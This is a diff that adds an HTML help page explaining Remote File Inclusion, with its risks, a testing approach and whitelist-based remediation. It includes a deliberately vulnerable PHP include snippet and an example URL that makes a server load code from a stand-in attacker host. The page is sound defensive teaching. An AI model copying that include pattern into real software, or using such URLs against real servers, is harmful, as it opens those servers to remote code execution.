@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Remote File Inclusion</title>
+</head><body><b>Summary</b>&nbsp;<br/>
+The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation. <br/>
+<br/>
+This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to: <br/>
+&nbsp;<ul><li>Code execution on the web server</li>
+<li>Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)</li>
+<li>Denial of Service (DoS)</li>
+<li>Sensitive Information Disclosure</li>
+</ul>
+<br/>
+<br/>
+<b>Remote File Inclusion</b>&nbsp;(also known as RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing external URL to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others. <br/>
+<br/>
+<br/>
+<b>&nbsp;How to Test </b><br/>
+Since RFI occurs when paths passed to "include" statements are not properly sanitized, in a blackbox testing approach, we should look for scripts which take filenames as parameters. Consider the following PHP example: <br/>
+&nbsp;$incfile = $_REQUEST["file"]; include($incfile.".php"); &nbsp;<br/>
+<br/>
+In this example the path is extracted from the HTTP request and no input validation is done (for example, by checking the input against a white list), so this snippet of code results vulnerable to this type of attack. Consider infact the following URL: <br/>
+&nbsp; http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page &nbsp;<br/>
+<br/>
+In this case the remote file is going to be included and any code contained in it is going to be run by the server. <br/>
+<br/>
+&nbsp;<b>References</b>&nbsp;<br/>
+<b>Whitepapers</b>&nbsp;<br/>
+&nbsp;<ul><li>&nbsp;“Remote File Inclusion” - <a href="http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion">http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion</a></li>
+<li>&nbsp;Wikipedia: "Remote File Inclusion" - <a href="http://en.wikipedia.org/wiki/Remote_File_Inclusion">http://en.wikipedia.org/wiki/Remote_File_Inclusion</a></li>
+</ul>
+<br/>
+<br/>
+&nbsp;<b>Remediation</b>&nbsp;<br/>
+The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path. <br/>
+&nbsp; </body></html>
